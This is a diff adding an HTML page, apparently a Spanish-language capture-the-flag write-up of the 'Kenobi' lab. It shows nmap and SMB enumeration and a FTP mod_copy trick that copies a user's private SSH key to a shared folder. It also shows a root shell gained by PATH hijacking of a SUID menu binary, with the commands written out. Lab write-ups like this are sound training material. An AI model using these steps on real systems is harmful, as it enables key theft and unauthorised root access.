@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        h2 {
+            color: #0081ab;
+        }
+
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1># NMAP</h1>
+        <img src="image.png" alt="NMAP Scan">
+
+        <h1># SMB</h1>
+        <p>Listamos directorios compartidos</p>
+        <img src="image-3.png" alt="SMB Shared Directories">
+        <p>Entramos en el usuario y descargamos el fichero <code>log.txt</code></p>
+        <img src="image-4.png" alt="Log.txt Download">
+
+        <h1># FTP</h1>
+        <img src="image-1.png" alt="FTP Image 1">
+        <img src="image-2.png" alt="FTP Image 2">
+        <p>Searchsploit para buscar exploits en una versión de un software</p>
+        <img src="image-5.png" alt="Searchsploit Result">
+
+        <p>Vimos que la carpeta <code>/var</code> estaba compartida. Movemos la clave privada a la carpeta.</p>
+        <pre>
+            <code>
+                SITE CPFR /home/kenobi/.ssh/id_rsa
+                SITE CPTO /var/tmp/id_rsa
+            </code>
+        </pre>
+        <img src="image-6.png" alt="FTP Move Key">
+
+        <p>Montamos la carpeta en nuestro equipo</p>
+        <img src="image-7.png" alt="Mount Folder">
+
+        <p>Cambiamos los permisos del <code>id_rsa</code></p>
+        <pre>
+            <code>sudo chmod 600 id_rsa</code>
+        </pre>
+
+        <h1># SSH</h1>
+        <p>Entramos en SSH con la clave privada</p>
+        <img src="image-9.png" alt="SSH Login">
+
+        <p>Buscamos carpetas con permisos</p>
+        <img src="image-8.png" alt="Permissions Folders">
+
+        <p>Vemos los permisos de la ruta</p>
+        <pre>
+            <code>ls -la /usr/bin/menu</code>
+        </pre>
+        <p>Podemos ejecutarlo con</p>
+        <pre>
+            <code>/usr/bin/menu</code>
+        </pre>
+
+        <p>Copiamos el shell <code>/bin/sh</code>, lo llamamos <code>curl</code>, le dimos los permisos correctos y luego pusimos su ubicación en nuestro path. Esto significa que cuando se ejecuta el binario <code>/usr/bin/menu</code>, está usando nuestra variable de entorno <code>PATH</code> para encontrar el binario "curl". ¡Que en realidad es una versión de <code>/bin/sh</code>, y como este archivo se ejecuta como root, ejecuta nuestro shell como root!</p>
+        <pre>
+            <code>
+                kenobi@kenobi:/tmp$ echo /bin/sh > curl
+                kenobi@kenobi:/tmp$ chmod 777 curl 
+                kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+                /usr/bin/menu   ->  op1
+            </code>
+        </pre>
+        <img src="image-10.png" alt="Shell Replacement">
+    </div>
+</body>
+</html>
